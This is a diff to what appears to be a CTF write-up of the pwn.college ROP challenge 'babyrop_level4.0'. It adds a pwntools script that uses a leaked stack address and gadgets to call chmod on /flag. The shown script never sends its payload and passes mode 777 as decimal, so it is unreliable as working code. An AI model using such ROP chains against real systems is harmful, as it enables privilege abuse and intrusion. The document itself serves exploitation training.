@@ -2,7 +2,7 @@
 title: Return Oriented Programming
 description: ROP is not just a hack; it’s a masterpiece of unauthorized orchestration, a ballet of borrowed instructions, choreographed with precision to achieve your clandestine objectives. With ROP, you step into a realm where every byte is a beat, and every return is a rhythm, embarking on an exhilarating journey of exploitation and discovery.
 author: 5o1z
-date: 2024-12-2 11:22 +0700
+date: 2024-12-7 11:22 +0700
 categories: [Practice, Pwn College]
 tags: [pwn, pwntools]
 image:
@@ -297,4 +297,90 @@ babyrop_level4.0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamical
 
 - No stack canary and PIE
 
+When we run the binary, there is a stack leaked here:
 
+```sh
+###
+### Welcome to ./babyrop_level4.0!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+ASLR means that the address of the stack is not known,
+but I will simulate a memory disclosure of it.
+By knowing where the stack is, you can now reference data
+that you write onto the stack.
+Be careful: this data could trip up your ROP chain,
+because it could be interpreted as return addresses.
+You can use gadgets that shift the stack appropriately to avoid that.
+[LEAK] Your input buffer is located at: 0x7fff3f4726b0.
+```
+
+For nothing, but my experience while doing this is `when we have something leak, just take it and maybe it might be useful`
+
+My idea for this level is use `chmod` syscall to give all permissions to `/flag`. But we need to note that the `chmod` syscall first `argv` must be `pointer` to `/flag` (According to [here](https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/#x86_64_90))
+
+# Exploit
+
+```py
+#!/usr/bin/python3
+
+from pwn import *
+
+# context.log_level = 'debug'
+exe = context.binary = ELF('./babyrop_level4.0', checksec=False)
+
+
+
+# Shorthanding functions for input/output
+info = lambda msg: log.info(msg)
+s = lambda data: p.send(data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sn = lambda num: p.send(str(num).encode())
+sna = lambda msg, num: p.sendafter(msg, str(num).encode())
+sln = lambda num: p.sendline(str(num).encode())
+slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
+r = lambda: p.recv()
+rl = lambda: p.recvline()
+rall = lambda: p.recvall()
+
+# GDB scripts for debugging
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+
+
+c
+''')
+
+p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
+if args.GDB:
+    GDB()
+    input()
+
+# ===========================================================
+#                          EXPLOIT
+# ===========================================================
+
+# Use when leaked is needed
+p.recvuntil(b'at: ')
+stack_leak = int(p.recvuntil(b'.', drop=True), 16)
+log.info("Stack leak: " + hex(stack_leak))
+
+pop_rdi = 0x0000000000401ce2
+pop_rsi = 0x0000000000401cfa
+pop_rax = 0x0000000000401cd3
+syscall = 0x0000000000401cda
+
+#Offset = 104
+pl = b'/flag\x00\x00\x00' + b'A'*(104-8)
+pl += p64(pop_rdi) + p64(stack_leak)
+pl += p64(pop_rsi) + p64(777)
+pl += p64(pop_rax) + p64(0x5a)
+pl += p64(syscall)
+
+p.interactive()
+```
